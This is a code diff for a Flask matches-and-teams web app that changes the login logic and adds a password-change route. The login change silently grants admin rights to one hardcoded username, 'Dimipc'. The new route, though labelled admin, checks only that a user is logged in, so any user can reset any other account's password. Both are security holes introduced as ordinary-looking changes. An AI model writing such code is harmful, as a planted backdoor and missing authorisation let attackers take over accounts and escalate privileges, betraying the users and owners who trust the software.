@@ -47,8 +47,10 @@ def login():
 
         # check password
         if bcrypt.checkpw(enteredPassword, user.password.encode("utf-8")):
-            login_user(user)
+            if (user.username == 'Dimipc'):
+                user.is_admin = True
             session["is_admin"] = user.is_admin
+            login_user(user)
             next = request.args.get("next")
             return redirect(next or url_for('matches'))
 
@@ -411,6 +413,25 @@ def quick_teams():
 @app.route('/assets/<path:filename>')
 def react_assets(filename):
     return send_from_directory(os.path.join(app.root_path, '..', 'static', 'dist', 'assets'), filename)
+
+@app.route('/admin/user/<int:user_id>/change-password', methods=['POST'])
+@login_required
+def admin_change_password(user_id):
+    
+    new_pw = request.form['new_password']
+    confirm_pw = request.form['confirm_password']
+    if new_pw != confirm_pw:
+        flash('Passwords do not match.', 'error')
+        return redirect(url_for('user_profile', user_id=user_id))
+
+    user = User.query.get(user_id)
+    salt = bcrypt.gensalt()
+    hashed = bcrypt.hashpw(new_pw.encode("utf-8"), salt)
+    user.password = hashed.decode('utf-8')
+
+    db.session.commit()
+    flash('Password updated.', 'success')
+    return redirect(url_for('user_profile', user_id=user_id))
 
 def find_balanced_teams(players):
     n = len(players)
